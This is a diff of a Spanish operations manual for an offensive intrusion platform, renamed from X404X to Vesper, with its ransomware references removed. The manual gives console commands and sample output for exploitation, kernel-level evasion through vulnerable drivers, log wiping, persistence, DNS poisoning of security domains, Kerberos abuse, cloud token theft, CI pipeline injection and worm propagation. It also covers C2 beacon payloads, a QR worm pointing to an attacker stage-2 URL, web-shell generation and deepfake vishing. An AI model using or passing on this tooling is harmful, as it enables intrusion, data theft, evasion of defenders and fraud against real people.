@@ -1,4 +1,4 @@
-# X404X — Manual Operacional Completo
+# Vesper — Manual Operacional Completo
 
 > Plataforma autónoma de Red Team · 45 módulos · 4 fases · ~12,700 líneas
 > Go + Python + WASM · Post-Quantum C2 · Kernel Evasion · Exotic Propagation
@@ -40,7 +40,6 @@ git
 pip install -r requirements.txt
 
 # Go modules
-cd internal/ransomware && go mod tidy && cd ../..
 ```
 
 ```yaml
@@ -105,7 +104,6 @@ bash deploy/deploy.sh
 
 # El script ejecuta:
 #  1. Verifica dependencias (Go + Python3)
-#  2. Opcionalmente compila el payload ransomware
 #  3. Inicia el bridge Python en puerto 9100
 #  4. Inicia el servidor C2 (Pulse-C2)
 #  5. Inicia el dashboard (API + Web)
@@ -113,7 +111,6 @@ bash deploy/deploy.sh
 
 # Flags disponibles:
 bash deploy/deploy.sh --dev              # Modo desarrollo (hot-reload)
-bash deploy/deploy.sh --build-ransomware # Compilar payload
 bash deploy/deploy.sh --c2 10.0.0.1     # Especificar IP del C2
 bash deploy/deploy.sh --target-os linux  # SO objetivo del payload
 ```
@@ -122,10 +119,9 @@ bash deploy/deploy.sh --target-os linux  # SO objetivo del payload
 
 ```bash
 # Paso 1: Clonar y preparar
-git clone https://github.com/Ruby570bocadito/X404X.git
-cd X404X
+git clone https://github.com/Ruby570bocadito/Vesper.git
+cd Vesper
 pip install -r requirements.txt
-cd internal/ransomware && go mod tidy && cd ../..
 
 # Paso 2: Iniciar el Bridge Python
 cd modules/bridge
@@ -135,13 +131,13 @@ cd ../..
 
 # Paso 3: Compilar y lanzar el C2 Dashboard
 cd plugins/pulse-c2/src/go
-go build -o x404x-dashboard ./cmd/dashboard
-./x404x-dashboard -port 9090 &
+go build -o vesper-dashboard ./cmd/dashboard
+./vesper-dashboard -port 9090 &
 cd ../../../..
 # Abrir: http://localhost:9090
 
 # Paso 4: Consola interactiva
-cd cmd/x404x
+cd cmd/vesper
 go run . console
 ```
 
@@ -198,7 +194,6 @@ Operador → [Consola CLI / Dashboard Web]
         [Core Engine Go]
    ┌────────┼────────┐
    ▼        ▼        ▼
-Ransomware Evasion  Propagation
 Engine    Suite     Vectors
    │        │        │
    └────────┼────────┘
@@ -215,7 +210,6 @@ Plugin    Ops      BT
 
 | Componente | Ruta | Lenguaje | Descripción |
 |------------|------|----------|-------------|
-| **Core Engine** | `internal/ransomware/` | Go | Motor de ransomware, evasión, propagación |
 | **AI Orchestrator** | `internal/appstate/` | Go | FSM con Q-learning |
 | **Dispatcher** | `internal/dispatch/` | Go | Mapeo MITRE ATT&CK |
 | **Agent** | `internal/agent/` | Go | Post-explotación, privesc |
@@ -236,11 +230,11 @@ Plugin    Ops      BT
 ### 4.1 Inicio
 
 ```bash
-cd cmd/x404x
+cd cmd/vesper
 go run . console
 
 # Prompt:
-# x404x >
+# vesper >
 ```
 
 ### 4.2 Comandos de Navegación
@@ -248,7 +242,7 @@ go run . console
 | Comando | Acción |
 |---------|--------|
 | `help` | Lista todos los comandos disponibles |
-| `banner` | Muestra el banner ASCII X404X |
+| `banner` | Muestra el banner ASCII Vesper |
 | `exit` / `quit` | Sale de la consola |
 | `version` | Muestra versión del framework |
 | `clear` | Limpia la pantalla |
@@ -288,7 +282,6 @@ go run . console
 | `persist` | Instala persistencia |
 | `lateral --target <IP>` | Movimiento lateral |
 | `exfil --path <ruta>` | Exfiltración de datos |
-| `ransomware --target <dir>` | Ejecuta ransomware |
 | `propagate --vector <nombre>` | Propagación vía vector específico |
 
 ### 4.6 Comandos de Infraestructura
@@ -316,44 +309,44 @@ go run . console
 ### 4.8 Flujo de Ataque Completo
 
 ```
-x404x > campaign start --name "Operation Nightfall"
+vesper > campaign start --name "Operation Nightfall"
 [+] Campaign started: Operation Nightfall
 [+] FSM state: idle → recon
 
-x404x > recon --target 10.0.0.0/24
+vesper > recon --target 10.0.0.0/24
 [+] Scanning 254 hosts...
 [+] Found: 12 hosts, 47 open ports
 [+] FSM state: recon → exploiting
 
-x404x > exploit --target 10.0.0.10
+vesper > exploit --target 10.0.0.10
 [+] CVE-2017-0144: SMB probe sent
 [+] CVE-2021-44228: Log4Shell payload delivered
 [+] Access obtained: 10.0.0.10
 [+] FSM state: exploiting → privesc
 
-x404x > privesc
+vesper > privesc
 [+] BYOVD: Loading WinRing0.sys
 [+] DKOM: SYSTEM token stolen
 [+] FSM state: privesc → persisting
 
-x404x > persist
+vesper > persist
 [+] WER Hangs hijack installed
 [+] Startup persistence: OK
 [+] Scheduled task: WerSyncHang created
 [+] FSM state: persisting → lateral
 
-x404x > lateral --target 10.0.0.20
+vesper > lateral --target 10.0.0.20
 [+] Kerberos: Unconstrained delegation found on DC01
 [+] Coercion: PrinterBug sent to DC01
 [+] TGT captured: Administrator@AD.DOMAIN.LOCAL
 [+] Pass-the-Ticket: Access to 10.0.0.20
 
-x404x > exfil --path /sensitive/data
+vesper > exfil --path /sensitive/data
 [+] MFT Slack: 4KB stored in NTFS slack space
 [+] DNS DoH: Data chunked via Cloudflare
 [+] Exfiltration complete
 
-x404x > killchain
+vesper > killchain
  RECON [██████████] DONE
  ACCESS [██████████] DONE
  EXEC   [██████████] DONE
@@ -405,10 +398,10 @@ x404x > killchain
 
 ```bash
 # Desde la consola interactiva
-x404x > campaign start --name "Operation Name" --targets targets.json
+vesper > campaign start --name "Operation Name" --targets targets.json
 
 # Desde CLI
-./x404x campaign start --name "Operation Name" --targets targets.json
+./vesper campaign start --name "Operation Name" --targets targets.json
 
 # Opciones:
 #   --name         Nombre de la campaña
@@ -449,16 +442,16 @@ x404x > campaign start --name "Operation Name" --targets targets.json
 Carga 5 drivers vulnerables para operaciones a nivel kernel.
 
 ```bash
-x404x > use evasion/byovd_loader
-x404x (byovd_loader) > show options
+vesper > use evasion/byovd_loader
+vesper (byovd_loader) > show options
 
 # Parámetros:
 #   DRIVERS     WinRing0,Gdrv,RTCore64,kprocesshacker,cpuz
 #   TARGET_PATH C:\Windows\System32\drivers
 #   ACTION      install / uninstall / list
 
-x404x (byovd_loader) > set DRIVERS WinRing0,Gdrv
-x404x (byovd_loader) > run
+vesper (byovd_loader) > set DRIVERS WinRing0,Gdrv
+vesper (byovd_loader) > run
 ```
 
 **Capacidades:**
@@ -471,10 +464,10 @@ x404x (byovd_loader) > run
 Ocultación de procesos vía manipulación directa de kernel.
 
 ```bash
-x404x > use evasion/dkom
-x404x (dkom) > set PID 1337
-x404x (dkom) > set ACTION hide
-x404x (dkom) > run
+vesper > use evasion/dkom
+vesper (dkom) > set PID 1337
+vesper (dkom) > set ACTION hide
+vesper (dkom) > run
 ```
 
 **Acciones disponibles:**
@@ -486,8 +479,8 @@ x404x (dkom) > run
 #### Anti-Reversing (`evasion/anti_reversing`)
 
 ```bash
-x404x > use evasion/anti_reversing
-x404x > run
+vesper > use evasion/anti_reversing
+vesper > run
 # Output:
 #   [✓] Debugger: Not present
 #   [✓] Remote Debugger: Not detected
@@ -501,10 +494,10 @@ x404x > run
 #### Anti-Forensics (`evasion/anti_forensics_adv`)
 
 ```bash
-x404x > use evasion/anti_forensics_adv
-x404x (anti_forensics_adv) > set ACTIONS dod_wipe,mft_corrupt,event_clear
-x404x (anti_forensics_adv) > set TARGET_PATH /var/log/audit/
-x404x (anti_forensics_adv) > run
+vesper > use evasion/anti_forensics_adv
+vesper (anti_forensics_adv) > set ACTIONS dod_wipe,mft_corrupt,event_clear
+vesper (anti_forensics_adv) > set TARGET_PATH /var/log/audit/
+vesper (anti_forensics_adv) > run
 ```
 
 **Técnicas:**
@@ -518,9 +511,9 @@ x404x (anti_forensics_adv) > run
 #### WER Persistence (`evasion/wer_persistence`)
 
 ```bash
-x404x > use evasion/wer_persistence
-x404x (wer_persistence) > set PAYLOAD_DLL C:\Windows\Temp\payload.dll
-x404x (wer_persistence) > run
+vesper > use evasion/wer_persistence
+vesper (wer_persistence) > set PAYLOAD_DLL C:\Windows\Temp\payload.dll
+vesper (wer_persistence) > run
 ```
 
 **Métodos:**
@@ -533,26 +526,26 @@ x404x (wer_persistence) > run
 #### MFT Slack Storage (`evasion/mft_slack`)
 
 ```bash
-x404x > use evasion/mft_slack
-x404x (mft_slack) > set ACTION store
-x404x (mft_slack) > set DATA "agent_fragment_base64..."
-x404x (mft_slack) > run
+vesper > use evasion/mft_slack
+vesper (mft_slack) > set ACTION store
+vesper (mft_slack) > set DATA "agent_fragment_base64..."
+vesper (mft_slack) > run
 ```
 
 #### WFP DNS Poisoning (`evasion/wfp_dns_poison`)
 
 ```bash
-x404x > use evasion/wfp_dns_poison
-x404x (wfp_dns_poison) > set C2_SERVER 10.0.0.1
-x404x (wfp_dns_poison) > set DOMAINS login.microsoftonline.com,*.defender.microsoft.com
-x404x (wfp_dns_poison) > run
+vesper > use evasion/wfp_dns_poison
+vesper (wfp_dns_poison) > set C2_SERVER 10.0.0.1
+vesper (wfp_dns_poison) > set DOMAINS login.microsoftonline.com,*.defender.microsoft.com
+vesper (wfp_dns_poison) > run
 ```
 
 #### Blue Pill Hypervisor (`evasion/blue_pill`)
 
 ```bash
-x404x > use evasion/blue_pill
-x404x (blue_pill) > run
+vesper > use evasion/blue_pill
+vesper (blue_pill) > run
 # Output:
 #   [✓] VT-x supported
 #   [✓] VMXON region: 4096 bytes
@@ -564,10 +557,10 @@ x404x (blue_pill) > run
 #### LOLBin Chainer (`evasion/lolbin_chainer`)
 
 ```bash
-x404x > use evasion/lolbin_chainer
-x404x (lolbin_chainer) > set PAYLOAD calc.exe
-x404x (lolbin_chainer) > set CHAIN_SIZE 5
-x404x (lolbin_chainer) > run
+vesper > use evasion/lolbin_chainer
+vesper (lolbin_chainer) > set PAYLOAD calc.exe
+vesper (lolbin_chainer) > set CHAIN_SIZE 5
+vesper (lolbin_chainer) > run
 # Output (random each time):
 #   mshta.exe → rundll32.exe → certutil.exe → bitsadmin.exe → wmic.exe
 ```
@@ -579,9 +572,9 @@ x404x (lolbin_chainer) > run
 #### Kernel DNS Driver (`evasion/wfp_kernel_dns`)
 
 ```bash
-x404x > use evasion/wfp_kernel_dns
-x404x (wfp_kernel_dns) > set C2_IP 10.0.0.1
-x404x (wfp_kernel_dns) > run
+vesper > use evasion/wfp_kernel_dns
+vesper (wfp_kernel_dns) > set C2_IP 10.0.0.1
+vesper (wfp_kernel_dns) > run
 ```
 
 ### 6.2 FASE 2 — C2 Hardened (6 módulos)
@@ -589,12 +582,12 @@ x404x (wfp_kernel_dns) > run
 #### SPIFFE mTLS (`c2/spiffe_mtls`)
 
 ```bash
-x404x > use c2/spiffe_mtls
-x404x (spiffe_mtls) > set TRUST_DOMAIN x404x.c2
-x404x (spiffe_mtls) > set AGENT_PATH /agent/cell-001
-x404x (spiffe_mtls) > run
+vesper > use c2/spiffe_mtls
+vesper (spiffe_mtls) > set TRUST_DOMAIN vesper.c2
+vesper (spiffe_mtls) > set AGENT_PATH /agent/cell-001
+vesper (spiffe_mtls) > run
 # Output:
-#   SPIFFE ID: spiffe://x404x.c2/agent/cell-001
+#   SPIFFE ID: spiffe://vesper.c2/agent/cell-001
 #   SVID TTL: 1h
 #   Cert Serial: 0x...
 ```
@@ -602,8 +595,8 @@ x404x (spiffe_mtls) > run
 #### Multi-Channel C2 (`c2/multi_channel`)
 
 ```bash
-x404x > use c2/multi_channel
-x404x (multi_channel) > run
+vesper > use c2/multi_channel
+vesper (multi_channel) > run
 # Output:
 #   [✓] gRPC: 127.0.0.1:50051 — HEALTHY
 #   [✓] WebSocket: ws://127.0.0.1:8080/ws — HEALTHY
@@ -616,8 +609,8 @@ x404x (multi_channel) > run
 #### Ed25519 Signing (`c2/ed25519`)
 
 ```bash
-x404x > use c2/ed25519
-x404x (ed25519) > run
+vesper > use c2/ed25519
+vesper (ed25519) > run
 # Output:
 #   Public Key: a1b2c3d4...
 #   Key ID: e5f6a7b8
@@ -628,17 +621,17 @@ x404x (ed25519) > run
 #### Dashboard Ops (`c2/dashboard_ops`)
 
 ```bash
-x404x > use c2/dashboard_ops
-x404x (dashboard_ops) > set PORT 9090
-x404x (dashboard_ops) > run
+vesper > use c2/dashboard_ops
+vesper (dashboard_ops) > set PORT 9090
+vesper (dashboard_ops) > run
 # → http://localhost:9090
 ```
 
 #### Kyber-1024 + X25519 (`c2/kyber_hybrid`)
 
 ```bash
-x404x > use c2/kyber_hybrid
-x404x (kyber_hybrid) > run
+vesper > use c2/kyber_hybrid
+vesper (kyber_hybrid) > run
 # Output:
 #   Algorithm: Kyber-1024 + X25519 Hybrid KEM
 #   Public Key: 1600 bytes
@@ -649,9 +642,9 @@ x404x (kyber_hybrid) > run
 #### Proto Obfuscation (`c2/proto_obfuscate`)
 
 ```bash
-x404x > use c2/proto_obfuscate
-x404x (proto_obfuscate) > set PROTO_NAME agent.proto
-x404x (proto_obfuscate) > run
+vesper > use c2/proto_obfuscate
+vesper (proto_obfuscate) > set PROTO_NAME agent.proto
+vesper (proto_obfuscate) > run
 # Output:
 #   Obfuscated: XOR + AES-CTR + GZIP
 #   Original: 4096 bytes → Obfuscated: 1024 bytes (25%)
@@ -663,12 +656,12 @@ x404x (proto_obfuscate) > run
 #### Ultrasound QPSK (`hydra/ultrasound`)
 
 ```bash
-x404x > use hydra/ultrasound
-x404x (ultrasound) > set PAYLOAD "X404X_WORM_V3"
-x404x (ultrasound) > set CARRIER_FREQ 19000
-x404x (ultrasound) > run
+vesper > use hydra/ultrasound
+vesper (ultrasound) > set PAYLOAD "VESPER_WORM_V3"
+vesper (ultrasound) > set CARRIER_FREQ 19000
+vesper (ultrasound) > run
 # Output:
-#   WAV file: /tmp/x404x_ultrasound_12345.wav
+#   WAV file: /tmp/vesper_ultrasound_12345.wav
 #   Carrier: 19kHz, Symbol Rate: 100 baud
 #   Duration: 2.4s, Size: 211680 bytes
 ```
@@ -682,8 +675,8 @@ x404x (ultrasound) > run
 #### Powerline PLC (`hydra/powerline`)
 
 ```bash
-x404x > use hydra/powerline
-x404x (powerline) > run
+vesper > use hydra/powerline
+vesper (powerline) > run
 # Output:
 #   HomePlug devices: 3
 #   UPnP devices: 12
@@ -693,9 +686,9 @@ x404x (powerline) > run
 #### USB ADB (`hydra/usb_adb`)
 
 ```bash
-x404x > use hydra/usb_adb
-x404x (usb_adb) > set APK_PATH /tmp/payload.apk
-x404x (usb_adb) > run
+vesper > use hydra/usb_adb
+vesper (usb_adb) > set APK_PATH /tmp/payload.apk
+vesper (usb_adb) > run
 # Output:
 #   ADB devices: 2
 #   Installed on: emulator-5554 (OK)
@@ -705,17 +698,17 @@ x404x (usb_adb) > run
 #### DNS Rebinding (`hydra/dns_rebinding`)
 
 ```bash
-x404x > use hydra/dns_rebinding
-x404x (dns_rebinding) > set ATTACK_DOMAIN cdn.x404x-edge.net
-x404x (dns_rebinding) > set C2_SERVER 10.0.0.1
-x404x (dns_rebinding) > run
+vesper > use hydra/dns_rebinding
+vesper (dns_rebinding) > set ATTACK_DOMAIN cdn.vesper-edge.net
+vesper (dns_rebinding) > set C2_SERVER 10.0.0.1
+vesper (dns_rebinding) > run
 ```
 
 #### CI/CD Webhooks (`hydra/cicd_webhooks`)
 
 ```bash
-x404x > use hydra/cicd_webhooks
-x404x (cicd_webhooks) > run
+vesper > use hydra/cicd_webhooks
+vesper (cicd_webhooks) > run
 # Output:
 #   CI Environments detected: 2 (GITHUB_ACTIONS, JENKINS_HOME)
 #   [✓] GitHub Actions workflow injected
@@ -725,20 +718,20 @@ x404x (cicd_webhooks) > run
 #### VLAN Jump (`hydra/vlan_jump`)
 
 ```bash
-x404x > use hydra/vlan_jump
-x404x (vlan_jump) > set INTERFACE eth0
-x404x (vlan_jump) > set VLAN_RANGE 1,10,20,50,100
-x404x (vlan_jump) > run
+vesper > use hydra/vlan_jump
+vesper (vlan_jump) > set INTERFACE eth0
+vesper (vlan_jump) > set VLAN_RANGE 1,10,20,50,100
+vesper (vlan_jump) > run
 ```
 
 #### QR Worm (`hydra/qr_worm`)
 
 ```bash
-x404x > use hydra/qr_worm
-x404x (qr_worm) > set PAYLOAD "https://c2.x404x.online/stage2"
-x404x (qr_worm) > run
+vesper > use hydra/qr_worm
+vesper (qr_worm) > set PAYLOAD "https://c2.vesper.online/stage2"
+vesper (qr_worm) > run
 # Output:
-#   QR PNG: /tmp/x404x_qr_0_12345.png
+#   QR PNG: /tmp/vesper_qr_0_12345.png
 #   Version: 6, Modules: 25×25
 #   Capacity: 4,296 bits
 ```
@@ -746,8 +739,8 @@ x404x (qr_worm) > run
 #### PJL Worm (`hydra/pjl_worm`)
 
 ```bash
-x404x > use hydra/pjl_worm
-x404x (pjl_worm) > run
+vesper > use hydra/pjl_worm
+vesper (pjl_worm) > run
 # Output:
 #   Printers found: 4 (HP, Xerox, Canon, Brother)
 #   [✓] NVRAM read: OK
@@ -758,10 +751,10 @@ x404x (pjl_worm) > run
 #### Chronos NTP (`propagation/chronos_ntp`)
 
 ```bash
-x404x > use propagation/chronos_ntp
-x404x (chronos_ntp) > set ACTION forward
-x404x (chronos_ntp) > set HOURS 4
-x404x (chronos_ntp) > run
+vesper > use propagation/chronos_ntp
+vesper (chronos_ntp) > set ACTION forward
+vesper (chronos_ntp) > set HOURS 4
+vesper (chronos_ntp) > run
 # Output:
 #   Fake NTP server: listening on :123
 #   Time offset: +4h
@@ -772,10 +765,10 @@ x404x (chronos_ntp) > run
 #### Reflective DLL (`propagation/reflective_dll`)
 
 ```bash
-x404x > use propagation/reflective_dll
-x404x (reflective_dll) > set DLL_PATH /tmp/payload.dll
-x404x (reflective_dll) > set TARGET_PROCESS RuntimeBroker.exe
-x404x (reflective_dll) > run
+vesper > use propagation/reflective_dll
+vesper (reflective_dll) > set DLL_PATH /tmp/payload.dll
+vesper (reflective_dll) > set TARGET_PROCESS RuntimeBroker.exe
+vesper (reflective_dll) > run
 # Output:
 #   Method: NtCreateSection + NtMapViewOfSection
 #   Stager: 100 bytes (NASM)
@@ -786,9 +779,9 @@ x404x (reflective_dll) > run
 #### Kerberos Delegation (`propagation/kerberos_del`)
 
 ```bash
-x404x > use propagation/kerberos_del
-x404x (kerberos_del) > set DOMAIN AD.DOMAIN.LOCAL
-x404x (kerberos_del) > run
+vesper > use propagation/kerberos_del
+vesper (kerberos_del) > set DOMAIN AD.DOMAIN.LOCAL
+vesper (kerberos_del) > run
 # Output:
 #   Unconstrained Delegation: DC01, SQL01, WEB01
 #   [✓] Coercion: PrinterBug → DC01
@@ -799,8 +792,8 @@ x404x (kerberos_del) > run
 #### IMDSv2 Bypass (`propagation/imdsv2_bypass`)
 
 ```bash
-x404x > use propagation/imdsv2_bypass
-x404x (imdsv2_bypass) > run
+vesper > use propagation/imdsv2_bypass
+vesper (imdsv2_bypass) > run
 # Output:
 #   AWS Detected: Yes
 #   IMDSv2 Token: AQAEAA...
@@ -814,10 +807,10 @@ x404x (imdsv2_bypass) > run
 #### Cross-Platform Loader (`loader/cross_platform`)
 
 ```bash
-x404x > use loader/cross_platform
-x404x (cross_platform) > set TARGET_OS linux
-x404x (cross_platform) > set PAYLOAD "/bin/sh -c 'curl c2/beacon'"
-x404x (cross_platform) > run
+vesper > use loader/cross_platform
+vesper (cross_platform) > set TARGET_OS linux
+vesper (cross_platform) > set PAYLOAD "/bin/sh -c 'curl c2/beacon'"
+vesper (cross_platform) > run
 # Output:
 #   [✓] ELF x86-64: 4096 bytes
 #   [✓] Mach-O x86-64: 4096 bytes
@@ -829,8 +822,8 @@ x404x (cross_platform) > run
 #### JIT Polymorphism (`ai/jit_polymorphism`)
 
 ```bash
-x404x > use ai/jit_polymorphism
-x404x (jit_polymorphism) > run
+vesper > use ai/jit_polymorphism
+vesper (jit_polymorphism) > run
 # Output:
 #   Mutations: NOP-sleds → ConstObfuscate → RegisterReorder → InstructionSub → GarbageCode
 #   Original: 256 bytes → Mutated: 312 bytes
@@ -841,8 +834,8 @@ x404x (jit_polymorphism) > run
 #### AI FSM Orchestrator (`ai/orchestrator`)
 
 ```bash
-x404x > use ai/orchestrator
-x404x (orchestrator) > run
+vesper > use ai/orchestrator
+vesper (orchestrator) > run
 # Output:
 #   Algorithm: Q-Learning
 #   States: 8 (idle→evading)
@@ -855,9 +848,9 @@ x404x (orchestrator) > run
 #### Federated Learning (`ai/federated_learn`)
 
 ```bash
-x404x > use ai/federated_learn
-x404x (federated_learn) > set AGENTS 5
-x404x (federated_learn) > run
+vesper > use ai/federated_learn
+vesper (federated_learn) > set AGENTS 5
+vesper (federated_learn) > run
 # Output:
 #   FedAvg Round: 1
 #   Global Loss: 0.34
@@ -869,9 +862,9 @@ x404x (federated_learn) > run
 #### Autofactory Fuzzer (`ai/autofactory`)
 
 ```bash
-x404x > use ai/autofactory
-x404x (autofactory) > set TARGET_BINARY /usr/bin/target
-x404x (autofactory) > run
+vesper > use ai/autofactory
+vesper (autofactory) > set TARGET_BINARY /usr/bin/target
+vesper (autofactory) > run
 # Output:
 #   AFL++: /usr/local/bin/afl-fuzz (available)
 #   Mutations: 1000 cases, 5s
@@ -883,9 +876,9 @@ x404x (autofactory) > run
 #### Wazero Bridge (`bridge/wazero`)
 
 ```bash
-x404x > use bridge/wazero
-x404x (wazero) > set HANDLER handler_scan
-x404x (wazero) > run
+vesper > use bridge/wazero
+vesper (wazero) > set HANDLER handler_scan
+vesper (wazero) > run
 # Output:
 #   WASM compiled: handler_scan.wasm (2048 bytes)
 #   Module loaded: OK
@@ -895,8 +888,8 @@ x404x (wazero) > run
 #### RF Contagion (`rf_contagion/baseband`)
 
 ```bash
-x404x > use rf_contagion/baseband
-x404x (rf_contagion) > run
+vesper > use rf_contagion/baseband
+vesper (rf_contagion) > run
 # Output:
 #   SDR: HackRF One (hackrf://0)
 #   Modems: 2 (Quectel EC25, Sierra MC7455)
@@ -907,10 +900,10 @@ x404x (rf_contagion) > run
 #### Deepfake Vishing (`ai/deepfake_vishing`)
 
 ```bash
-x404x > use ai/deepfake_vishing
-x404x (deepfake_vishing) > set TARGET_NAME "John Smith"
-x404x (deepfake_vishing) > set COMPANY "Acme Corp"
-x404x (deepfake_vishing) > run
+vesper > use ai/deepfake_vishing
+vesper (deepfake_vishing) > set TARGET_NAME "John Smith"
+vesper (deepfake_vishing) > set COMPANY "Acme Corp"
+vesper (deepfake_vishing) > run
 # Output:
 #   Script: "Hello, this is IT Security Operations..."
 #   TTS Model: tacotron2-DDC
@@ -927,8 +920,8 @@ x404x (deepfake_vishing) > run
 ```bash
 # Iniciar dashboard
 cd plugins/pulse-c2/src/go
-go build -o x404x-dashboard ./cmd/dashboard
-./x404x-dashboard -port 9090
+go build -o vesper-dashboard ./cmd/dashboard
+./vesper-dashboard -port 9090
 
 # Acceder en navegador
 open http://localhost:9090
@@ -986,10 +979,10 @@ ws.onmessage = function(event) {
 # config.yaml
 c2:
   spiffe:
-    trust_domain: "x404x.c2"
+    trust_domain: "vesper.c2"
     svid_ttl: 3600        # 1 hora
-    ca_cert: "/etc/x404x/ca.crt"
-    ca_key: "/etc/x404x/ca.key"
+    ca_cert: "/etc/vesper/ca.crt"
+    ca_key: "/etc/vesper/ca.key"
   mtls:
     enabled: true
     min_version: "1.3"
@@ -1010,20 +1003,20 @@ c2:
 
 ```bash
 # Generar par de claves
-x404x > c2 keygen
+vesper > c2 keygen
 
 # Firmar comando
-x404x > c2 sign --agent cell-001 --command "recon"
+vesper > c2 sign --agent cell-001 --command "recon"
 
 # Verificar firma
-x404x > c2 verify --signature "a1b2c3..." --key "d4e5f6..."
+vesper > c2 verify --signature "a1b2c3..." --key "d4e5f6..."
 ```
 
 ### 8.4 Post-Quantum Key Exchange
 
 ```bash
 # Intercambio híbrido Kyber-1024 + X25519
-x404x > c2 keyx --algo kyber-hybrid
+vesper > c2 keyx --algo kyber-hybrid
 
 # Resultado:
 #   Alice Pub: 1600 bytes (Kyber + X25519)
@@ -1053,7 +1046,7 @@ x404x > c2 keyx --algo kyber-hybrid
 
 ```bash
 # Test completo de evasión
-x404x > evasion test --all
+vesper > evasion test --all
 
 # Output:
 #   [✓] BYOVD: WinRing0 loaded
@@ -1087,13 +1080,13 @@ x404x > evasion test --all
 
 ```bash
 # Activar todos los vectores
-x404x > propagate --vector all
+vesper > propagate --vector all
 
 # Activar vectores específicos
-x404x > propagate --vector ultrasound,powerline,usb_adb
+vesper > propagate --vector ultrasound,powerline,usb_adb
 
 # Propagación sigilosa (velocidad reducida)
-x404x > propagate --stealth --delay 30
+vesper > propagate --stealth --delay 30
 ```
 
 ---
@@ -1104,24 +1097,24 @@ x404x > propagate --stealth --delay 30
 
 ```bash
 # Entrenar el orquestador
-x404x > ai train --episodes 1000
+vesper > ai train --episodes 1000
 
 # Predecir próxima acción
-x404x > ai predict --state recon
+vesper > ai predict --state recon
 # Output: exploit (confidence: 0.85, risk: 0.7)
 
 # Exportar Q-Table
-x404x > ai export --output qtable.json
+vesper > ai export --output qtable.json
 ```
 
 ### 11.2 Federated Learning
 
 ```bash
 # Iniciar ronda FedAvg
-x404x > ai fedavg --agents 5 --rounds 10
+vesper > ai fedavg --agents 5 --rounds 10
 
 # Perfilar víctima
-x404x > ai profile --user user-001
+vesper > ai profile --user user-001
 # Output:
 #   Login Times: 8.5, 9.0, 9.5, 13.0, 14.0, 18.0
 #   Typing Speed: 52.5 WPM
@@ -1129,14 +1122,14 @@ x404x > ai profile --user user-001
 #   Optimal Phish: 10:30 AM
 
 # Exportar modelo
-x404x > ai export-model --output fed_model.json
+vesper > ai export-model --output fed_model.json
 ```
 
 ### 11.3 Autofactory Fuzzer
 
 ```bash
 # Fuzzear binario objetivo
-x404x > ai fuzz --target /usr/bin/target --duration 60
+vesper > ai fuzz --target /usr/bin/target --duration 60
 
 # Output:
 #   Mutations: 12,000 cases
@@ -1149,10 +1142,10 @@ x404x > ai fuzz --target /usr/bin/target --duration 60
 
 ```bash
 # Clonar voz y llamar
-x404x > ai vishing --audio /tmp/ceo_voice.wav --target +15551234567
+vesper > ai vishing --audio /tmp/ceo_voice.wav --target +15551234567
 
 # Solo generar guión
-x404x > ai vishing --script-only --target-name "Jane Doe" --company "TechCorp"
+vesper > ai vishing --script-only --target-name "Jane Doe" --company "TechCorp"
 ```
 
 ---
@@ -1166,11 +1159,11 @@ x404x > ai vishing --script-only --target-name "Jane Doe" --company "TechCorp"
 docker-compose -f lab/docker-compose.edr.yml up -d
 
 # Contenedores:
-#   x404x_edr_target      Windows Server 2022 (Defender ATP)
-#   x404x_siem            Elasticsearch 8
-#   x404x_kibana          Kibana 8
-#   x404x_sysmon_collector Sysmon + Auditd
-#   x404x_test_runner     Test automation
+#   vesper_edr_target      Windows Server 2022 (Defender ATP)
+#   vesper_siem            Elasticsearch 8
+#   vesper_kibana          Kibana 8
+#   vesper_sysmon_collector Sysmon + Auditd
+#   vesper_test_runner     Test automation
 
 # Acceso:
 #   RDP: localhost:3389
@@ -1189,7 +1182,7 @@ docker-compose -f lab/docker-compose.edr.yml up -d
 #   5. In-memory payload execution
 
 # Ver logs de tests
-docker logs x404x_test_runner
+docker logs vesper_test_runner
 ```
 
 ### 12.3 Detener
@@ -1202,8 +1195,6 @@ docker-compose -f lab/docker-compose.edr.yml down
 
 ## 13. Generación de Payloads
 
-### 13.1 Payload Ransomware
-
 ```bash
 # PowerShell (Windows)
 python3 -c "
@@ -1211,11 +1202,9 @@ from plugins.worm.payloads.specialized_payloads import SpecializedPayloads
 p = SpecializedPayloads('10.0.0.1', 8443)
 
 # Simulación (markers seguros)
-sim_payload = p.generate_ransomware_payload(simulation=True)
 print(sim_payload[:200])
 
 # Real (AES-256-CBC)
-real_payload = p.generate_ransomware_payload(simulation=False)
 print(real_payload[:200])
 "
 ```
@@ -1247,7 +1236,6 @@ print(p.generate_web_shell('php')[:200])
 # Generar para múltiples plataformas
 python3 -c "
 import sys
-sys.path.insert(0, 'internal/ransomware/loader')
 # La carga cross-platform genera ELF, Mach-O, y APK
 "
 ```
@@ -1260,14 +1248,6 @@ sys.path.insert(0, 'internal/ransomware/loader')
 
 | Archivo | Handlers | Descripción |
 |---------|----------|-------------|
-| `ransomware.py` | 9 | Core ransomware (encrypt, scan, exfil) |
-| `ransomware_advanced.py` | 17 | Avanzado (USB, SCADA, Bluetooth, AI) |
-| `ransomware_v26.py` | 13 | v26 (POMDP, AI negotiation, evasion deep) |
-| `ransomware_v27.py` | 10 | v27 (UEFI, hypervisor, phishing) |
-| `ransomware_v28.py` | 23 | v28 (IoT, zombie, keyboard LED) |
-| `ransomware_v29.py` | 24 | v29 (HDD destroy, VRM, USB killer) |
-| `ransomware_v210.py` | 10 | v210 (Apocalipsis, Phantom) |
-| `ransomware_blockz.py` | 14 | Block Z (genetic, deepfake, EDR kill) |
 | `attacks.py` | 9 | Brute force, SQLi, XSS, DoS |
 | `bloodhound.py` | 5 | SharpHound data collection |
 | `cred_dump.py` | 6 | Credential dumping |
@@ -1293,7 +1273,6 @@ print(result["success"])  # True
 
 | Problema | Causa | Solución |
 |----------|-------|----------|
-| `go: module not found` | Go modules no inicializados | `cd internal/ransomware && go mod tidy` |
 | `ModuleNotFoundError: cryptography` | Dependencias Python no instaladas | `pip install -r requirements.txt` |
 | Dashboard no carga | Puerto en uso o firewall | `lsof -i :9090` o cambiar puerto |
 | Bridge Python no responde | Puerto 9100 ocupado | `pkill -f bridge.py && python3 bridge.py &` |
@@ -1306,29 +1285,29 @@ print(result["success"])  # True
 
 ```bash
 # Logs del bridge Python
-tail -f /tmp/x404x_bridge.log
+tail -f /tmp/vesper_bridge.log
 
 # Logs del C2
-tail -f /tmp/x404x_c2.log
+tail -f /tmp/vesper_c2.log
 
 # Logs del dashboard
-tail -f /tmp/x404x_dashboard.log
+tail -f /tmp/vesper_dashboard.log
 
 # Logs del worm
 tail -f logs/worm_*.log
 
 # Logs de Docker
